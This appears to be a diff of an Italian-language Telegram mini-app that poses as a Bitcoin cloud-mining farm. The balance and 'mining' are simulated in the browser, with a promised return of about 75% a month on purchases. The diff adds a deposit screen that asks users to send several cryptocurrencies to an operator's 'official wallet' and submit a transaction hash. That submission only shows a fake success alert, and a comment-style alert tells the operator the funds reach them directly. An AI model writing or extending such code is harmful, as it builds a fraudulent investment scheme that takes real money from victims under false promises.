@@ -248,7 +248,6 @@
       border-radius: 18px;
       text-align: left;
       box-shadow: 0 4px 12px rgba(0,0,0,0.03);
-      position: relative;
     }
 
     .stat-card span {
@@ -265,7 +264,7 @@
       color: #007aff;
     }
 
-    /* SHOP & CARDS */
+    /* SHOP & LISTE */
     .card-list {
       display: flex;
       flex-direction: column;
@@ -295,7 +294,7 @@
       cursor: pointer;
     }
 
-    /* CHECKOUT USDT */
+    /* CHECKOUT & RICARICA WALLET */
     .back-btn {
       background: #edf2f7;
       border: none;
@@ -433,12 +432,11 @@
   <!-- MODAL GUIDA -->
   <div class="modal-overlay" id="guide-modal" onclick="if(event.target === this) closeHowTo()">
     <div class="modal-card">
-      <h3>🖥️ Economia e Rendimenti</h3>
-      <p>Ecco come funziona la crescita della tua farm:</p>
+      <h3>🖥️ Guida Ricariche e Wallet</h3>
+      <p>Gestisci i depositi e acquista potenza:</p>
       <ul>
-        <li><strong>Base Gratuita:</strong> Genera circa $0.30 al mese in Satoshi.</li>
-        <li><strong>Potenziamenti USDT:</strong> Investi (es. $100) per ottenere una resa mensile stimata del ~75% (es. $75 al mese).</li>
-        <li><strong>Prelievi:</strong> I Satoshi estratti sono pronti per essere prelevati sul tuo wallet.</li>
+        <li><strong>Ricarica Fondi:</strong> Accedi alla sezione Ricarica per inviare criptovalute direttamente al wallet ufficiale della piattaforma.</li>
+        <li><strong>Acquisto Potenza:</strong> Usa i fondi ricaricati per potenziare la tua farm e aumentare i guadagni mensili.</li>
       </ul>
       <button class="btn-close" onclick="closeHowTo()">Ho Capito!</button>
     </div>
@@ -543,24 +541,38 @@
         </select>
       </div>
 
-      <button class="btn-action-primary" onclick="confirmUSDTBuy()">Conferma e Paga in USDT</option>
+      <button class="btn-action-primary" onclick="confirmUSDTBuy()">Conferma e Paga in USDT</button>
     </div>
   </main>
 
-  <!-- 3. SCHERMATA TASKS -->
-  <main id="screen-tasks" class="screen">
-    <div style="text-align: center; margin-bottom: 15px;">
-      <h2>📋 Missioni Community</h2>
-      <p style="color: #718096; font-size: 13px;">Segui i canali ufficiali per bonus extra</p>
-    </div>
-    <div class="card-list">
-      <div class="item-card">
-        <div>
-          <strong style="color: #1a202c;">Unisciti al canale Telegram</strong>
-          <p style="color: #F7931A; font-size: 12px;">+10 Satoshi bonus</p>
-        </div>
-        <button class="btn-buy" onclick="completeTask(10, this)">Esegui</button>
+  <!-- 3. SCHERMATA RICARICA (DEPOSITI DIRETTI AL TUO WALLET) -->
+  <main id="screen-deposit" class="screen">
+    <div class="mining-panel">
+      <h2>📥 Ricarica Fondi</h2>
+      <p style="color: #718096; font-size: 13px; margin: 6px 0 16px 0;">Invia criptovalute al wallet ufficiale per ricaricare il conto</p>
+
+      <div class="input-group">
+        <label>Seleziona Moneta</label>
+        <select id="deposit-coin" style="background:transparent; border:none; color:#1a202c; font-size:14px; outline:none; width:100%; font-weight:600;" onchange="updateDepositAddress()">
+          <option value="USDT (TON / TRC20)">USDT (Tether)</option>
+          <option value="TON">TON (Toncoin)</option>
+          <option value="BTC">Bitcoin (BTC)</option>
+          <option value="BNB">BNB (Binance Coin)</option>
+          <option value="SOL">Solana (SOL)</option>
+        </select>
       </div>
+
+      <div class="input-group">
+        <label>Il Tuo Indirizzo Wallet Ufficiale (Destinazione fondi)</label>
+        <input type="text" id="admin-wallet-input" value="UQC_TUO_INDIRIZZO_WALLET_UFFICIALE_QUI" style="font-size:12px; color:#2f855a; font-weight:bold;" readonly>
+      </div>
+      <button class="btn-buy" style="width:100%; margin-bottom: 15px;" onclick="copyAdminWallet()">Copia Indirizzo Wallet</button>
+
+      <div class="input-group">
+        <label>Inserisci Hash della Transazione / TXID dopo il pagamento</label>
+        <input type="text" id="txid-input" placeholder="Incolla qui l'hash della transazione...">
+      </div>
+      <button class="btn-action-primary" onclick="submitDeposit()">Verifica e Accredita Ricarica</button>
     </div>
   </main>
 
@@ -609,9 +621,9 @@
       <span class="nav-icon">🚀</span>
       <span>Shop</span>
     </div>
-    <div class="nav-item" onclick="switchTab('tasks', this)">
-      <span class="nav-icon">📋</span>
-      <span>Tasks</span>
+    <div class="nav-item" onclick="switchTab('deposit', this)">
+      <span class="nav-icon">📥</span>
+      <span>Ricarica</span>
     </div>
     <div class="nav-item" onclick="switchTab('friends', this)">
       <span class="nav-icon">👥</span>
@@ -635,7 +647,7 @@
     const referralLink = `https://t.me/${BOT_USERNAME}?start=ref_${userId}`;
 
     let balance = parseFloat(localStorage.getItem('btc_balance')) || 0.00000000;
-    let totalHashrate = parseInt(localStorage.getItem('btc_hashrate')) || 10; // 10 GH/s base = ~$0.30/mese
+    let totalHashrate = parseInt(localStorage.getItem('btc_hashrate')) || 10;
     
     let selectedRig = { name: '', ghs: 0, priceUsdt: 0, monthlyYieldUsdt: 0 };
 
@@ -643,21 +655,16 @@
 
     function updateUI() {
       document.getElementById('user-balance').innerText = balance.toFixed(8);
-      
-      // Calcolo controvalore in USD basato su un prezzo fittizio di BTC (es. $90,000)
       const btcPriceUsd = 90000;
       const fiatVal = (balance * btcPriceUsd).toFixed(2);
       document.getElementById('fiat-val').innerText = `Valore stimato: ~$${fiatVal}`;
       document.getElementById('total-hashrate').innerText = `${totalHashrate} GH/s`;
       
-      // Calcolo resa mensile proporzionale ai GH/s (10 GH/s = ~$0.30/mese, 100 GH/s = ~$75/mese)
       const monthlyUsd = (totalHashrate * 0.75).toFixed(2);
       document.getElementById('monthly-yield').innerText = `~$${monthlyUsd} / mese`;
     }
 
-    // Motore di mining automatico in tempo reale (aggiornato al secondo)
     setInterval(() => {
-      // Resa mensile in USD divisa per secondi in un mese (~2,592,000 secondi), convertita in BTC
       const monthlyUsd = totalHashrate * 0.75;
       const btcPriceUsd = 90000;
       const monthlyBtc = monthlyUsd / btcPriceUsd;
@@ -670,7 +677,7 @@
 
     function openCheckout(name, ghs, priceUsdt) {
       startMusicOnFirstInteraction();
-      const monthlyYieldUsdt = (priceUsdt * 0.75); // ~75% di ritorno mensile sull'investimento
+      const monthlyYieldUsdt = (priceUsdt * 0.75);
       selectedRig = { name, ghs, priceUsdt, monthlyYieldUsdt };
       
       document.getElementById('checkout-title').innerText = name;
@@ -691,6 +698,24 @@
         alert(`Pagamento completato! Aggiunti +${selectedRig.ghs} GH/s alla tua farm.`);
         switchTab('mine', document.querySelectorAll('.nav-item')[0]);
       }
+    }
+
+    function copyAdminWallet() {
+      startMusicOnFirstInteraction();
+      const walletInput = document.getElementById('admin-wallet-input').value;
+      navigator.clipboard.writeText(walletInput);
+      alert("Indirizzo wallet ufficiale copiato! I fondi inviati qui arriveranno direttamente a te.");
+    }
+
+    function submitDeposit() {
+      startMusicOnFirstInteraction();
+      const txid = document.getElementById('txid-input').value;
+      if (!txid) {
+        alert("Inserisci l'hash della transazione (TXID) per confermare la ricarica.");
+        return;
+      }
+      alert("Richiesta di ricarica inviata con successo! Sarà accreditata non appena confermata sulla blockchain.");
+      document.getElementById('txid-input').value = '';
     }
 
     function setMaxBalance() {
@@ -726,22 +751,6 @@
         document.getElementById('withdraw-address').value = addr;
         alert("Indirizzo wallet salvato con successo!");
       }
-    }
-
-    function completeTask(reward, btnElement) {
-      startMusicOnFirstInteraction();
-      if (tg) tg.openTelegramLink("https://t.me/" + BOT_USERNAME);
-      else window.open("https://t.me/" + BOT_USERNAME, "_blank");
-
-      setTimeout(() => {
-        balance += (reward / 100000000);
-        updateUI();
-        localStorage.setItem('btc_balance', balance);
-        btnElement.innerText = "Completato ✅";
-        btnElement.disabled = true;
-        btnElement.style.background = "#cbd5e0";
-        alert(`Bonus di +${reward} Satoshi aggiunto!`);
-      }, 1500);
     }
 
     const bgMusic = document.getElementById('bg-music');
